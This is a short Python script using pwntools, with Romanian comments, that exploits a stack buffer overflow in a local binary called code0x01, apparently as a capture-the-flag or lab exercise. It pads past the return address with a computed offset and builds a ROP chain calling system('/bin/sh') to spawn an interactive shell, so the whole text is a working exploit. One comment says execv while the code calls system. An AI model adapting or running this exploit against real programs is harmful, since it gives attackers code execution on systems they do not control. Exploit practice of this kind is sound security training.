from pwn import *

# Inițializează procesul și binarul
p = process('./code0x01')
e = ELF('./code0x01')
rop = ROP(e)
offset = 0x7fffffffdb80 - 0x7fffffffdb61


# Creează un ROP chain pentru execv('/bin/sh')
rop.system(next(e.search(b'/bin/sh\x00')))

# Construiți payload-ul
payload = b'A' * offset  # Padding până la adresa de retur
payload += rop.chain()   # ROP chain

# Trimite payload-ul și încearcă să deschizi un shell
p.sendline(payload)
p.interactive()

